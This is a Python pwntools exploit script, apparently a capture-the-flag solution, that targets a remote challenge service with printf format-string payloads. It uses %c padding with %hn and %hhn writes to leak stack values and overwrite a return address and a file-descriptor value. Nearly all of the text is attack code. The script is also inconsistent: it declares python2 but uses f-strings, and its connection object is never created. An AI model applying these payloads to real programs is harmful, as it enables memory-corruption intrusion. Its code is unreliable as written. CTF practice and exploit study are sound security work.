#!/usr/bin/env python2

from pwn import *

IP, PORT = 'pwn01.chal.ctf.westerns.tokyo', 12463
DEBUG = False

context.arch = 'x86_64'
context.aslr = False
context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']


def hn(prev, targ):
    val = targ - prev
    return (val & 0xffff) if (val & 0xffff) > 0 else 0x10000

def hhn(prev, targ):
    val = targ - prev
    return (val & 0xff) if (val & 0xff) > 0 else 0x100

def do_leak():
    payload = ("%lx|" * 0x3f)[:-1]
    p.sendline(payload)
    return list(map(lambda x: int(x, 16), p.recvline(False).split('|')))

while True:
    try:

        # let's go gacha and :pray:
        #printf_rsp = 0xdf20  # just before entering dprintf()
        printf_rsp = 0x7e50
        RET = printf_rsp + 0x38  # returning back to main
        AGAIN_IP = 0x8E
        A_pi = 18
        B_pi = 46
        A = printf_rsp + (A_pi - 5) * 8  # 18$
        B = printf_rsp + (B_pi - 5) * 8  # 46$
        fd_ofs = 0x4c


        def flip_ret():
            payload  = "%c"*(A_pi - 2) + f"%{hn((A_pi - 2), A)}c"
            payload += "%hn"
            
            payload += "%c"*(B_pi - A_pi - 2) + f"%{hn((B_pi - A_pi - 2) + A, RET)}c"
            payload += "%hn"
            
            payload += f"%{hhn(RET, AGAIN_IP)}c%{A_pi}$hhn"
            
            assert(len(payload) < 200)
            print(payload+'\n' + str(len(payload)))
        
        def write_ret(ofs, val):
            C = printf_rsp + ofs
            truect = 0  # manage this value, since we're using %hhn -> %hn
            
            payload  = "%c"*(A_pi - 2) + f"%{hhn((A_pi - 2), AGAIN_IP)}c"
            payload += "%hhn"
            truect += (A_pi - 2) + hhn((A_pi - 2), AGAIN_IP)

            payload += "%c"*(B_pi - A_pi - 2) + f"%{hn((B_pi - A_pi - 2) + truect, C)}c"
            payload += "%hn"
            truect += (B_pi - A_pi - 2) + hn((B_pi - A_pi - 2) + truect, C)
            
            payload += f"%{hhn(truect, val)}c%{A_pi}$hhn"
            truect += hhn(truect, val)
            
            payload += f"%{hn(truect, RET)}c%{B_pi}$hn"
            
            assert(len(payload) < 200)

            print(payload+'\n' + str(len(payload)))

        def leak_ret():
            payload  = "%16lx|"*0x17
            payload += f"%{hhn(17*0x17, AGAIN_IP)}c%{A_pi}$hhn"
            
            assert(len(payload) < 200)
            p.sendline(payload)
            
            res = list(map(lambda x: int(x, 16), p.recvuntil('done.\n', True).split('|')[:0x17]))
            return res

        flip_ret()

        write_ret(fd_ofs, 1)



        break
    except EOFError:
        log.warning('retry')
        p.close()
        continue
    except KeyboardInterrupt:
        break
